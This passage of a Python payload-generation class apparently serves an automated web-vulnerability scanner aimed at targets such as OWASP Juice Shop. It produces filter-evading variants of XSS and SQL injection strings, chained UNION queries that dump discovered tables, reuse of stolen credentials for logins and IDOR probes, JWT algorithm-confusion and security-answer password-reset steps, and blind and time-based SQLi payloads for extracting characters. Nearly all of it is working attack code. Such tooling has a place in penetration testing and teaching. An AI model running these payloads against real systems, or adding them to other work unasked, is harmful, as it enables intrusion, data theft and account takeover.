        Args:
            payload: The original payload string.

        Returns:
            List of unique variation strings (includes original).
        """
        variations: List[str] = [payload]

        alternating = ""
        for i, c in enumerate(payload):
            if i % 2 == 0:
                alternating += c.upper()
            else:
                alternating += c.lower()
        if alternating != payload:
            variations.append(alternating)

        upper_payload = payload.upper()
        if upper_payload != payload:
            variations.append(upper_payload)

        lower_payload = payload.lower()
        if lower_payload != payload:
            variations.append(lower_payload)

        random_case = ""
        for c in payload:
            if random.random() > 0.5:
                random_case += c.upper()
            else:
                random_case += c.lower()
        if random_case != payload and random_case not in variations:
            variations.append(random_case)

        if " " in payload:
            variations.append(payload.replace(" ", "/**/"))
            variations.append(payload.replace(" ", "\t"))
            variations.append(payload.replace(" ", "\n"))
            variations.append(payload.replace(" ", "\r\n"))
            variations.append(payload.replace(" ", "%09"))
            variations.append(payload.replace(" ", "%0a"))
            variations.append(payload.replace(" ", "%0d"))
            variations.append(payload.replace(" ", "%0b"))
            variations.append(payload.replace(" ", "%0c"))
            variations.append(payload.replace(" ", "%a0"))
            variations.append(payload.replace(" ", "/*! */"))

        url_encoded = self.encode_payload(payload, "url")
        if url_encoded != payload:
            variations.append(url_encoded)

        double_encoded = self.encode_payload(payload, "double_url")
        if double_encoded != payload and double_encoded != url_encoded:
            variations.append(double_encoded)

        html_encoded = self.encode_payload(payload, "html")
        if html_encoded != payload:
            variations.append(html_encoded)

        html_hex = self.encode_payload(payload, "html_hex")
        if html_hex != payload:
            variations.append(html_hex)

        unicode_encoded = self.encode_payload(payload, "unicode")
        if unicode_encoded != payload:
            variations.append(unicode_encoded)

        if payload.startswith("'"):
            concat_variation = "'||'" + payload[1:]
            variations.append(concat_variation)
            char_variation = "chr(39)||'" + payload[1:]
            variations.append(char_variation)

        if len(payload) > 2:
            null_start = "%00" + payload
            variations.append(null_start)
            mid = len(payload) // 2
            null_mid = payload[:mid] + "%00" + payload[mid:]
            variations.append(null_mid)
            null_end = payload + "%00"
            variations.append(null_end)

        variations.append(" " + payload)
        variations.append("\t" + payload)
        variations.append(payload + " ")
        variations.append(payload + "\t")

        if "<script>" in payload.lower():
            nested = payload.replace("<script>", "<scr<script>ipt>")
            nested = nested.replace("</script>", "</scr</script>ipt>")
            variations.append(nested)

            svg_variant = payload.replace("<script>", "<svg/onload=").replace("</script>", ">")
            if svg_variant != payload:
                variations.append(svg_variant)

        if "alert" in payload:
            variations.append(payload.replace("alert", "prompt"))
            variations.append(payload.replace("alert", "confirm"))
            variations.append(payload.replace("alert", "console.log"))
            variations.append(payload.replace("alert(", "alert`"))
            if "alert(" in payload:
                variations.append(payload.replace("alert(", "window['al'+'ert']("))
                variations.append(payload.replace("alert(", "self[atob('YWxlcnQ=')]("))
                variations.append(payload.replace("alert(", "top['al'+'ert']("))

        if "SELECT" in payload.upper() and "UNION" in payload.upper():
            variations.append(payload.replace("UNION SELECT", "UNION ALL SELECT"))
            variations.append(payload.replace("UNION SELECT", "UNION%23%0aSELECT"))
            variations.append(payload.replace("UNION SELECT", "UNION/*!50000SELECT*/"))
            variations.append(payload.replace("SELECT", "/*!50000SELECT*/"))

        if "OR" in payload.upper() and "=" in payload:
            variations.append(payload.replace("OR", "||"))
            variations.append(payload.replace("AND", "&&"))

        seen = set()
        unique: List[str] = []
        for v in variations:
            if v not in seen:
                seen.add(v)
                unique.append(v)

        return unique

    # ================================================================== #
    #  CHAINING SUPPORT
    # ================================================================== #
    def get_chained_payloads(self, findings: List[Dict]) -> List[Dict]:
        """
        Generate new payloads based on previous scan findings.
        Uses discovered information to create targeted payloads.

        Args:
            findings: List of finding dicts from previous scan phases.
                      Each finding should have:
                      - type: "sqli", "xss", "credential", "table_name", etc.
                      - value: the discovered value
                      - details: additional details

        Returns:
            List of new targeted payload dicts.
        """
        chained: List[Dict] = []

        for finding in findings:
            finding_type = finding.get("type", "")
            finding_value = finding.get("value", "")
            finding_details = finding.get("details", {})

            if finding_type == "table_name":
                table = finding_value
                chained.append({
                    "value": f"' UNION SELECT group_concat(name||':'||type,',') FROM pragma_table_info('{table}')--",
                    "description": f"Chained: Extract columns from discovered table '{table}'",
                    "detection_hint": f"Column names and types from {table}",
                    "sub_type": "chained_union",
                    "severity": "critical",
                    "chained_from": f"table_name:{table}",
                    "tags": ["chained", "data_extraction"],
                })
                chained.append({
                    "value": f"' UNION SELECT group_concat(*) FROM {table}--",
                    "description": f"Chained: Dump all data from discovered table '{table}'",
                    "detection_hint": f"All data from {table} in response",
                    "sub_type": "chained_union",
                    "severity": "critical",
                    "chained_from": f"table_name:{table}",
                    "tags": ["chained", "data_extraction"],
                })

            elif finding_type == "column_name":
                table = finding_details.get("table", "Unknown")
                column = finding_value
                chained.append({
                    "value": f"' UNION SELECT group_concat({column},',') FROM {table}--",
                    "description": f"Chained: Extract all values of '{column}' from '{table}'",
                    "detection_hint": f"All {column} values from {table}",
                    "sub_type": "chained_union",
                    "severity": "critical",
                    "chained_from": f"column:{table}.{column}",
                    "tags": ["chained", "data_extraction"],
                })

            elif finding_type == "credential":
                email = finding_details.get("email", "")
                password = finding_details.get("password", "")
                if email and password:
                    chained.append({
                        "value": f"{email}:{password}",
                        "description": f"Chained: Use discovered credential for login",
                        "detection_hint": "Login succeeds with extracted credentials",
                        "sub_type": "chained_credential",
                        "severity": "critical",
                        "chained_from": f"credential:{email}",
                        "tags": ["chained", "credential_use"],
                    })
                    for user_id in range(1, 6):
                        chained.append({
                            "value": str(user_id),
                            "description": f"Chained: IDOR test with ID={user_id} using stolen session",
                            "detection_hint": f"Access to user {user_id} data with authenticated session",
                            "sub_type": "chained_idor",
                            "severity": "high",
                            "chained_from": f"credential:{email}",
                            "tags": ["chained", "idor"],
                        })

            elif finding_type == "db_type":
                db = finding_value.lower()
                db_payloads = self.get_payloads("sqli", context={"db_type": db})
                for p in db_payloads[:15]:
                    p["chained_from"] = f"db_type:{db}"
                    p["tags"] = p.get("tags", []) + ["chained"]
                    chained.append(p)

            elif finding_type == "framework":
                fw = finding_value.lower()
                if fw == "angular":
                    xss_payloads = self.get_payloads("xss", context={"framework": "angular"})
                    for p in xss_payloads[:15]:
                        p["chained_from"] = f"framework:{fw}"
                        p["tags"] = p.get("tags", []) + ["chained"]
                        chained.append(p)

            elif finding_type == "waf_detected":
                waf_name = finding_value.lower()
                for attack_type in ["sqli", "xss", "path_traversal"]:
                    waf_payloads = self.get_waf_bypass_payloads(attack_type)
                    for p in waf_payloads[:5]:
                        p["chained_from"] = f"waf:{waf_name}"
                        p["tags"] = p.get("tags", []) + ["chained"]
                        chained.append(p)

            elif finding_type == "column_count":
                count = int(finding_value)
                null_list = ",".join(["NULL"] * count)
                chained.append({
                    "value": f"' UNION SELECT {null_list}--",
                    "description": f"Chained: UNION with confirmed {count} columns",
                    "detection_hint": "UNION query succeeds with correct column count",
                    "sub_type": "chained_union",
                    "severity": "critical",
                    "chained_from": f"column_count:{count}",
                    "tags": ["chained", "union"],
                })
                for col_pos in range(1, count + 1):
                    cols = ["NULL"] * count
                    cols[col_pos - 1] = "sqlite_version()"
                    chained.append({
                        "value": f"' UNION SELECT {','.join(cols)}--",
                        "description": f"Chained: Version extraction in column position {col_pos}",
                        "detection_hint": f"SQLite version appears in column {col_pos} output",
                        "sub_type": "chained_union",
                        "severity": "high",
                        "chained_from": f"column_count:{count}",
                        "tags": ["chained", "version_detection"],
                    })

            elif finding_type == "jwt_public_key":
                chained.append({
                    "value": '{"alg":"HS256","typ":"JWT"}',
                    "description": "Chained: Algorithm confusion RS256→HS256 using discovered public key",
                    "detection_hint": "Sign with HS256 using public key as HMAC secret",
                    "sub_type": "chained_jwt",
                    "severity": "critical",
                    "chained_from": "jwt_public_key",
                    "tags": ["chained", "jwt", "algorithm_confusion"],
                })

            elif finding_type == "security_answer":
                user_id = finding_details.get("user_id", "")
                answer = finding_value
                chained.append({
                    "value": answer,
                    "description": f"Chained: Use discovered security answer for user {user_id} password reset",
                    "detection_hint": "Password reset succeeds with extracted security answer",
                    "sub_type": "chained_password_reset",
                    "severity": "critical",
                    "chained_from": f"security_answer:user_{user_id}",
                    "tags": ["chained", "password_reset"],
                })

            elif finding_type == "endpoint":
                endpoint = finding_value
                for test_id in range(1, 6):
                    chained.append({
                        "value": endpoint.replace("{id}", str(test_id)),
                        "description": f"Chained: IDOR test on discovered endpoint with ID={test_id}",
                        "detection_hint": f"Access to resource {test_id} on {endpoint}",
                        "sub_type": "chained_idor",
                        "severity": "high",
                        "chained_from": f"endpoint:{endpoint}",
                        "tags": ["chained", "idor"],
                    })

        return chained

    # ================================================================== #
    #  SEARCH AND FILTER
    # ================================================================== #
    def search_payloads(self, keyword: str, attack_type: Optional[str] = None) -> List[Dict]:
        """
        Search payloads by keyword across value, description, and tags.

        Args:
            keyword: Search term (case-insensitive).
            attack_type: Optional - limit search to specific attack type.

        Returns:
            List of matching payload dicts with 'attack_type' field added.
        """
        keyword_lower = keyword.lower()
        results: List[Dict] = []

        search_categories = {}
        if attack_type:
            if attack_type in self._payloads:
                search_categories[attack_type] = self._payloads[attack_type]
        else:
            search_categories = self._payloads

        for cat_name, cat_payloads in search_categories.items():
            for p in cat_payloads:
                match = False
                if keyword_lower in p.value.lower():
                    match = True
                elif keyword_lower in p.description.lower():
                    match = True
                elif keyword_lower in p.detection_hint.lower():
                    match = True
                elif keyword_lower in p.sub_type.lower():
                    match = True
                elif any(keyword_lower in tag.lower() for tag in p.tags):
                    match = True

                if match:
                    d = p.to_dict()
                    d["attack_type"] = cat_name
                    results.append(d)

        return results

    def get_payloads_by_severity(self, attack_type: str, severity: str) -> List[Dict]:
        """
        Get payloads filtered by exact severity level.

        Args:
            attack_type: The attack category.
            severity: One of "critical", "high", "medium", "low"

        Returns:
            List of payload dicts matching the severity.
        """
        raw = self._payloads.get(attack_type, [])
        return [p.to_dict() for p in raw if p.severity == severity.lower()]

    def get_payloads_by_tag(self, tag: str, attack_type: Optional[str] = None) -> List[Dict]:
        """
        Get payloads that have a specific tag.

        Args:
            tag: Tag string to filter by.
            attack_type: Optional category filter.

        Returns:
            List of matching payload dicts.
        """
        results: List[Dict] = []
        tag_lower = tag.lower()

        categories = {}
        if attack_type:
            if attack_type in self._payloads:
                categories[attack_type] = self._payloads[attack_type]
        else:
            categories = self._payloads

        for cat_name, cat_payloads in categories.items():
            for p in cat_payloads:
                if any(tag_lower == t.lower() for t in p.tags):
                    d = p.to_dict()
                    d["attack_type"] = cat_name
                    results.append(d)

        return results

    def get_waf_bypass_payloads(self, attack_type: str) -> List[Dict]:
        """
        Get only WAF-bypass payloads for a specific attack type.

        Args:
            attack_type: The attack category.

        Returns:
            List of WAF bypass payload dicts.
        """
        raw = self._payloads.get(attack_type, [])
        return [p.to_dict() for p in raw if p.waf_bypass]

    def get_juice_shop_payloads(self, attack_type: Optional[str] = None) -> List[Dict]:
        """
        Get payloads specifically marked for OWASP Juice Shop.

        Args:
            attack_type: Optional category filter.

        Returns:
            List of Juice Shop payload dicts.
        """
        results: List[Dict] = []

        categories = {}
        if attack_type:
            if attack_type in self._payloads:
                categories[attack_type] = self._payloads[attack_type]
        else:
            categories = self._payloads

        for cat_name, cat_payloads in categories.items():
            for p in cat_payloads:
                if p.juice_shop:
                    d = p.to_dict()
                    d["attack_type"] = cat_name
                    results.append(d)

        return results

    # ================================================================== #
    #  DYNAMIC PAYLOAD GENERATION
    # ================================================================== #
    def generate_sqli_union_payload(self, column_count: int, extract_position: int, extract_expression: str, db_type: str = "sqlite") -> str:
        """
        Dynamically generate a UNION-based SQL injection payload.

        Args:
            column_count: Number of columns in the target query.
            extract_position: Which column position to inject the expression (1-based).
            extract_expression: SQL expression to extract data.
            db_type: Target database type.

        Returns:
            Complete UNION SELECT payload string.
        """
        if extract_position < 1 or extract_position > column_count:
            raise ValueError(f"extract_position must be between 1 and {column_count}")

        columns = ["NULL"] * column_count
        columns[extract_position - 1] = extract_expression

        comment = "--" if db_type in ("sqlite", "postgresql", "mssql") else "#"

        return f"' UNION SELECT {','.join(columns)}{comment}"

    def generate_boolean_blind_payload(self, condition: str, db_type: str = "sqlite") -> Tuple[str, str]:
        """
        Generate a pair of boolean blind payloads (true/false).

        Args:
            condition: The SQL condition to test.
            db_type: Target database type.

        Returns:
            Tuple of (true_payload, false_payload).
        """
        comment = "--" if db_type in ("sqlite", "postgresql", "mssql") else "#"
        true_payload = f"' AND ({condition}){comment}"
        false_payload = f"' AND NOT ({condition}){comment}"
        return true_payload, false_payload

    def generate_time_blind_payload(self, condition: str, db_type: str = "sqlite", delay: int = 5) -> str:
        """
        Generate a time-based blind injection payload.

        Args:
            condition: The SQL condition to test.
            db_type: Target database type.
            delay: Delay in seconds.

        Returns:
            Time-based blind payload string.
        """
        comment = "--" if db_type in ("sqlite", "postgresql", "mssql") else "#"

        if db_type == "sqlite":
            blob_size = delay * 40000000
            return f"' AND (SELECT CASE WHEN ({condition}) THEN RANDOMBLOB({blob_size}) ELSE 1 END){comment}"
        elif db_type == "mysql":
            return f"' AND IF(({condition}), SLEEP({delay}), 0){comment}"
        elif db_type == "postgresql":
            return f"' AND (SELECT CASE WHEN ({condition}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END){comment}"
        elif db_type == "mssql":
            return f"'; IF ({condition}) WAITFOR DELAY '0:0:{delay}'{comment}"
        else:
            return f"' AND (SELECT CASE WHEN ({condition}) THEN RANDOMBLOB({delay * 40000000}) ELSE 1 END){comment}"

    def generate_char_extraction_payloads(self, query: str, position: int, db_type: str = "sqlite") -> List[Tuple[str, str]]:
        """
        Generate boolean blind payloads to extract a single character at a given position.

        Args:
            query: The SQL subquery that returns the target string.
            position: Character position to extract (1-based).
            db_type: Target database type.

        Returns:
            List of (payload, character) tuples for each printable ASCII character.
        """
        results: List[Tuple[str, str]] = []
        comment = "--" if db_type in ("sqlite", "postgresql", "mssql") else "#"

        test_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "@.-_!#$%&"

        for c in test_chars:
            if db_type == "sqlite":
                condition = f"SUBSTR(({query}),{position},1)='{c}'"
            elif db_type == "mysql":
                condition = f"SUBSTRING(({query}),{position},1)='{c}'"
            elif db_type == "postgresql":
                condition = f"SUBSTRING(({query}) FROM {position} FOR 1)='{c}'"
            elif db_type == "mssql":
                condition = f"SUBSTRING(({query}),{position},1)='{c}'"
            else:
                condition = f"SUBSTR(({query}),{position},1)='{c}'"

            payload = f"' AND ({condition}){comment}"
            results.append((payload, c))

        return results

    # ================================================================== #
    #  UTILITY METHODS
    # ================================================================== #
    def get_all_attack_types(self) -> List[str]:
        """Get list of all available attack type identifiers."""
        return list(self._payloads.keys())

    def get_payload_count(self, attack_type: Optional[str] = None) -> int:
        """
        Get the count of payloads for a specific type or total.

        Args:
            attack_type: Specific type, or None for total count.

        Returns:
            Integer count of payloads.
        """
        if attack_type:
            return len(self._payloads.get(attack_type, []))
        return sum(len(v) for v in self._payloads.values())

    def summary(self) -> Dict[str, int]:
        """
        Get a summary of payload counts by attack type.

        Returns:
            Dict mapping attack type to payload count.
        """
        return {k: len(v) for k, v in self._payloads.items()}

    def get_all_tags(self, attack_type: Optional[str] = None) -> List[str]:
        """
        Get all unique tags across all payloads.

        Args:
            attack_type: Optional filter by attack type.

        Returns:
            Sorted list of unique tag strings.
        """
        tags = set()

        categories = {}
        if attack_type:
            if attack_type in self._payloads:
                categories[attack_type] = self._payloads[attack_type]
        else:
            categories = self._payloads

        for cat_payloads in categories.values():
            for p in cat_payloads:
                for t in p.tags:
                    tags.add(t)

        return sorted(tags)

    def get_all_sub_types(self, attack_type: str) -> List[str]:
        """
        Get all unique sub_types for a specific attack category.

        Args:
            attack_type: The attack category.

        Returns:
            Sorted list of unique sub_type strings.
        """
        raw = self._payloads.get(attack_type, [])
        sub_types = set()
        for p in raw:
            if p.sub_type:
                sub_types.add(p.sub_type)
        return sorted(sub_types)

    def export_payloads(self, attack_type: str, format: str = "json") -> str:
        """
        Export payloads to string format.

        Args:
            attack_type: The attack category to export.
            format: "json", "txt", or "csv"

        Returns:
            String representation of payloads in chosen format.
        """
        raw = self._payloads.get(attack_type, [])

        if format == "json":
            return json.dumps([p.to_dict() for p in raw], indent=2)

        elif format == "txt":
            lines = []
            for p in raw:
                lines.append(p.value)
            return "\n".join(lines)

        elif format == "csv":
            lines = ["value,description,sub_type,severity,waf_bypass"]
            for p in raw:
                escaped_value = p.value.replace('"', '""')
                escaped_desc = p.description.replace('"', '""')
                lines.append(f'"{escaped_value}","{escaped_desc}","{p.sub_type}","{p.severity}","{p.waf_bypass}"')
            return "\n".join(lines)

        else:
            raise ValueError(f"Unknown format '{format}'. Available: json, txt, csv")

    def get_payload_by_index(self, attack_type: str, index: int) -> Optional[Dict]:
        """
        Get a specific payload by its index in the category.

        Args:
            attack_type: The attack category.
            index: Zero-based index.

        Returns:
            Payload dict or None if index out of range.
        """
        raw = self._payloads.get(attack_type, [])
        if 0 <= index < len(raw):
            return raw[index].to_dict()
        return None

    def get_random_payloads(self, attack_type: str, count: int = 5, context: Optional[Dict] = None) -> List[Dict]:
        """
        Get random payloads from a category, optionally filtered by context.

        Args:
            attack_type: The attack category.
            count: Number of random payloads to return.
            context: Optional context for pre-filtering.

        Returns:
            List of randomly selected payload dicts.
        """
        all_payloads = self.get_payloads(attack_type, context)
        if len(all_payloads) <= count:
            return all_payloads
        return random.sample(all_payloads, count)